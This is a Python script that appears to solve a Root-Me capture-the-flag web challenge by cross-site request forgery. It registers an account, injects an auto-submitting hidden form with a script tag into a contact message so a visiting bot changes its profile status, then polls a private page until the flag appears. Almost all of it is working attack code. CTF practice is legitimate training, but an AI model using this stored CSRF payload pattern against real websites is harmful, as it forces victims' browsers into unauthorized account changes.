
import re
import sys
import time
import random
import requests

# CONSTANTS

## Urls

URL_LOGIN = "http://challenge01.root-me.org/web-client/ch22/index.php"
URL_REGISTER = "http://challenge01.root-me.org/web-client/ch22/index.php?action=register"
URL_CONTACT = "http://challenge01.root-me.org/web-client/ch22/index.php?action=contact"
URL_VULNERABLE = "http://challenge01.root-me.org/web-client/ch22/index.php?action=profile"
URL_PRIVATE = "http://challenge01.root-me.org/web-client/ch22/index.php?action=private"

print(f"[+] URL Vulnerable: {URL_VULNERABLE}")

## Credentials

CREDENTIALS = ( ("juliaM3ller", "csrf"), ("maxw3ll", "frsc"), ("p0w", "123") )

print(f"[*] Choosing generic name and password...")

USERNAME, PASSWORD = random.choice(CREDENTIALS) 

# PAYLOAD FOR CSRF

print(f"[*] Building payload...")

payload = f"<form name=\"csrf\" action=\"{URL_VULNERABLE}\" method=\"POST\">"
payload += f"<input type=\"hidden\" name=\"username\" value=\"{USERNAME}\">"
payload += f"<input type=\"hidden\" name=\"status\" value=\"on\" />"
payload += "</form>"
payload += "<script>document.forms[0].submit()</script>"

# START ATTACK

print("[*] Launching exploit...")

## Data for register account
data = { "username": USERNAME, "password": PASSWORD }

## Create session
print("[*] Session created")
session = requests.Session()

## Register account
print(f"[*] Registering user with name={USERNAME} and password={PASSWORD}...")
session.post(URL_REGISTER, data=data)
print("[+] Registered user")

## Login account
session.post(URL_LOGIN, data=data)
print("[+] User session started")

## Build comment
print("[*] Injecting payload in comment")
comment = f"Good Morning bot! {payload}"
data = { "content": comment }

## Send payload in contact tab 
print("[*] Sending content...")
session.post(URL_CONTACT, data=data).text
time.sleep(5)
print("[+] Payload stored...")

# GET FLAG

finded = False
count = 0

while not finded:
    response = session.post(URL_PRIVATE)
    session.get(response.url)
    sys.stdout.write(f"\r[*] Refreshing {count}")
    sys.stdout.flush()
    if ("flag is" in response.text):
        finded = True
    count += 1

print("\n[+] Exploit completed")

flag = re.search(r":\s(.*)!",response.text).groups()[0]

print(f"[+] Flag: {flag}")
